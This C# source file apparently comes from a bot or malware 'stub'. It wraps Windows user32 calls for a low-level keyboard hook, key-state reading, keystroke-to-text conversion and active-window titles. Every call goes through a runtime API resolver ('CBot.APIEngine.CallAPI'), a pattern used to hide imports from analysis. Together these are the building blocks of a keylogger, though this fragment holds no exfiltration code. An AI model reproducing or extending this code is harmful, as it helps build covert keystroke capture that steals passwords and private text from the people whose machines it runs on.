using Stub.Core;
using Stub.Utilities;
using System;
using System.Collections.Generic;
using System.Text;

namespace Stub.WinAPI
{
    class CUser32
    {
        public delegate IntPtr LowLevelKeyboardProc(int iCode, IntPtr wParam, IntPtr lParam);

        public static IntPtr GetForegroundWindow()
        {
            return (IntPtr)CBot.APIEngine.CallAPI("user32", "GetForegroundWindow", new object[] { }, typeof(IntPtr));
        }

        public static int GetWindowText(IntPtr pHandle, StringBuilder sbBuffer, int iLength)
        {
            return (int)CBot.APIEngine.CallAPI("user32", "GetWindowTextW", new object[] { pHandle, sbBuffer, iLength }, typeof(int));
        }

        public static IntPtr SetWindowsHookEx(int iHook, LowLevelKeyboardProc fnCallback, IntPtr hMod, uint iThreadID)
        {
            return (IntPtr)CBot.APIEngine.CallAPI("user32", "SetWindowsHookExW", new object[] { iHook, fnCallback, hMod, iThreadID }, typeof(IntPtr));
        }

        public static IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam)
        {
            return (IntPtr)CBot.APIEngine.CallAPI("user32", "CallNextHookEx", new object[] { hhk, nCode, wParam, lParam }, typeof(IntPtr));
        }

        public static short GetKeyState(int iKey)
        {
            return (short)CBot.APIEngine.CallAPI("user32", "GetKeyState", new object[] { iKey }, typeof(short));
        }

        public static int ToUnicode(int iVirtKey, int iScanCode, byte[] arr_bKeyState, StringBuilder sbData, int iBufferSize, int iFlags)
        {
            return (int)CBot.APIEngine.CallAPI("user32", "ToUnicode", new object[] { iVirtKey, iScanCode, arr_bKeyState, sbData, iBufferSize, iFlags }, typeof(int));
        }

        public static bool GetKeyboardState(byte[] arr_bKeyboardState)
        {
            return (bool)CBot.APIEngine.CallAPI("user32", "GetKeyboardState", new object[] { arr_bKeyboardState }, typeof(bool));
        }
    }
}
